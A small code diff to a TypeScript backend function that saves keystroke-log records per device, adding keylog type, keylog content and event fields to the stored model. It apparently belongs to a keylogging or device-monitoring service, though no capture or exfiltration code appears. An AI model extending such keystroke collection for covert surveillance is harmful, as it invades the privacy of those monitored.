@@ -5,11 +5,13 @@ import { KeyLogsModelType } from "../utils";
 
 export const addNewKeyLogs = async (data: any) => {
 	try {
-		const { deviceId, logs } = data;
+		const { deviceId, keyLogsType, keylogs, event } = data;
 
 		const newKeyLog: KeyLogsModelType = new KeyLogs({
 			deviceId,
-			logs,
+			keyLogsType,
+			keylogs,
+			event,
 		});
 
 		await newKeyLog.save();
